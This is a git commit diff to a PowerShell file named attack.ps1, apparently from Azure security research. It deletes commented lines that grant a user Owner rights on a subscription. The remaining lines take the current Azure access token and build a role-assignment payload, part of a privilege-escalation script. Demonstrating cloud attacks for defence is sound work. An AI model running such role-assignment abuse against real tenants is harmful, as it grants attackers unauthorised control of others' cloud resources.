02c45f96b2fedfcfce64a9072613ad406e11b860
Rogier Dijkman <40334679+azurekid@users.noreply.github.com>
2023-06-22 00:44:43 +0200

    Update attack.ps1

--- attack.ps1
+++ attack.ps1
@@ -1,6 +1,3 @@
-# Install-Module AZ.Accounts -RequiredVersion 2.12.3 -Force
-# Import-Module Az.Resources -Force
-# New-AzRoleAssignment -SignInName 'h.sanders@securehats.nl' -Scope '/subscriptions/7570c6f7-9ca9-409b-aeaf-cb0f5ac1ad50' -RoleDefinitionName 'Owner'
 $token = (Get-AzAccessToken).token
 $headers = @{"Authorization"="Bearer $token"}
 $payload = '{"properties": {"roleDefinitionId": "/subscriptions/a925f2f7-5c63-4b7b-8799-25a5f97bc3b2/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635","principalId": "301dfac7-8f45-48ac-9868-e1f0e875385c","principalType": "User"}}'
